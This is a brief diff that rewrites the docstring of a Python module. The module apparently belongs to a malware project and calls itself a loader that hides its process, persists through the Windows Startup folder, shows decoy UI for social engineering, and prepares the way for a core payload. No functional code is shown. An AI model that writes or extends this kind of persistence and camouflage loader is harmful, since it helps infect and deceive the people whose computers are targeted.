@@ -1,7 +1,9 @@
 """
-Module: System Operations (Persistence & Camouflage)
-Description: Handles OS-level interactions including hiding the process, 
-             establishing persistence via Startup folder, and displaying decoy messages.
+Module: Deployment & Persistence (The Loader)
+Description: Manages the application's lifecycle and environment. 
+             Responsible for installation, persistence (Startup), and 
+             social engineering camouflage (Decoy UI). 
+             It prepares the environment for the core payload to run.
 """
 
 import os
